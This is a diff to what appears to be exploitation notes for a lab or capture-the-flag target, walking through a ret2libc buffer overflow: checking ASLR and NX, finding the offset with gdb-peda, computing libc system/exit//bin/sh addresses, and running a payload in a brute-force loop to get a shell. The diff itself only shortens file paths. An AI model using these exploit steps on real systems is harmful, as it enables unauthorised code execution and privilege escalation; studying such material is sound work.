@@ -11,7 +11,7 @@ cat /proc/sys/kernel/randomize_va_space
 
 # Another check for ASLR is checking if the libc address changes in the program
 # If the (0xb.....) value changes, ASLR is on
-ldd /usr/local/bin/target_program | grep libc
+ldd target_program | grep libc
 
 # apt install checksec to see if NX enabled
 # If it is, we can't run shellcode from the stack, which is where we can write
@@ -21,7 +21,7 @@ checksec --file=target_program
 # https://github.com/longld/peda
 
 # 1. Find the overflow offset using gdb
-gdb -q ./target_program
+gdb -q target_program
 
 # 2. Use pattern_create (part of PEDA) to create a 500 char pattern
 pattern_create 500
@@ -36,7 +36,7 @@ pattern_offset <value>
 run `python -c 'print "A"*<value> + "BBBB"'`
 
 # 6. Now find an address of libc, outside of gdb. Copy the (0xb....)
-ldd /usr/local/bin/target_program | grep libc
+ldd target_program | grep libc
 
 # 7. Get offsets for system, exit outside of gdb
 readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
@@ -51,10 +51,10 @@ system: 0xb75f8000+0x40310 = 0xB7638310
 
 # Run your overflow exploit as so (if ASLR were disabled)
 # The order is <offset>+system+exit+/bin/sh
-/usr/local/bin/target_program $(python -c 'print "\x90"*<offset-value> + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"');
+target_program $(python -c 'print "\x90"*<offset-value> + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"');
 
 # Because ASLR is enabled, run it in a loop until you get a shell
-while true; do /usr/local/bin/target_program $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done 
+while true; do target_program $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done 
 ```
 ---
 
